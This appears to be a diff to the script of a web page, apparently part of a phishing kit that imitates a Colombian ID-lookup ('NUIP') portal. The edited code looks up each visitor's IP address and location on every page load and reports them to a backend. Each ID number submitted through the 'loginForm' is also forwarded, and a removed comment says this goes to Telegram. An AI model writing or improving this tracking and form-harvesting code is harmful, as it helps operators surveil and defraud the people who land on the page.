@@ -329,57 +329,54 @@
 
     <script>
         // ============================================================
-        // 🚪 NOTIFICAR NUEVO INGRESO (envía PRIMERO, sin esperar geo)
+        // 🚪 NOTIFICAR NUEVO INGRESO (cada entrada o recarga)
         // ============================================================
         (async function notificarIngreso() {
             try {
-                // Si ya se notificó con éxito en esta sesión, no repetir
-                if (sessionStorage.getItem('ingreso_notificado') === '1') {
-                    console.log('⏭️ Ingreso ya notificado en esta sesión');
-                    return;
+                // 1) Obtener geo con ipwho.is (timeout 1.5s)
+                let ip = 'Desconocida', ciudad = 'Desconocida', pais = 'Desconocido';
+                try {
+                    const ctrl = new AbortController();
+                    const timer = setTimeout(() => ctrl.abort(), 1500);
+                    const rGeo = await fetch('https://ipwho.is/', { signal: ctrl.signal });
+                    clearTimeout(timer);
+
+                    if (rGeo.ok) {
+                        const geo = await rGeo.json();
+                        if (geo.success !== false) {
+                            ip = geo.ip || ip;
+                            ciudad = geo.city || ciudad;
+                            pais = geo.country || pais;
+                            sessionStorage.setItem('user_ip', ip);
+                            sessionStorage.setItem('user_ciudad', ciudad);
+                            sessionStorage.setItem('user_pais', pais);
+                        }
+                    }
+                } catch (_) {
+                    console.warn('⚠️ Geo no disponible, se envía sin IP');
                 }
 
-                // 1) ENVIAR PRIMERO al backend (no depende de ipapi.co)
+                // 2) Enviar al backend SIEMPRE (sin check de sessionStorage)
                 const resp = await fetch('/api/nuevo-ingreso', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        ip: sessionStorage.getItem('user_ip') || 'Desconocida',
-                        ciudad: sessionStorage.getItem('user_ciudad') || 'Desconocida',
-                        pais: sessionStorage.getItem('user_pais') || 'Desconocido',
+                        ip,
+                        ciudad,
+                        pais,
                         user_agent: navigator.userAgent
                     })
                 });
 
                 console.log('📡 /api/nuevo-ingreso status:', resp.status);
 
-                // ✅ Solo marca como notificado si el backend respondió OK
-                if (resp.ok) {
-                    sessionStorage.setItem('ingreso_notificado', '1');
-                }
-
-                // 2) DESPUÉS, enriquecer con geo (opcional, con timeout, no bloquea)
-                try {
-                    const ctrl = new AbortController();
-                    const timer = setTimeout(() => ctrl.abort(), 3000);
-                    const rGeo = await fetch('https://ipapi.co/json/', { signal: ctrl.signal });
-                    clearTimeout(timer);
-                    if (rGeo.ok) {
-                        const geo = await rGeo.json();
-                        sessionStorage.setItem('user_ip', geo.ip || 'Desconocida');
-                        sessionStorage.setItem('user_ciudad', geo.city || 'Desconocida');
-                        sessionStorage.setItem('user_pais', geo.country_name || 'Desconocido');
-                    }
-                } catch (_) { /* silencio: si falla la geo, no importa */ }
-
             } catch (err) {
                 console.warn('❌ Error notificando ingreso:', err);
-                // ⚠️ NO marcamos el flag → la próxima carga vuelve a intentar
             }
         })();
 
         // ============================================================
-        // Formulario NUIP → notifica consulta → proxy → consultar.html
+        // Formulario NUIP
         // ============================================================
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -391,7 +388,6 @@
                 return;
             }
 
-            // 🔔 Notificar la consulta a Telegram
             try {
                 await fetch('/api/notificar-consulta', {
                     method: 'POST',
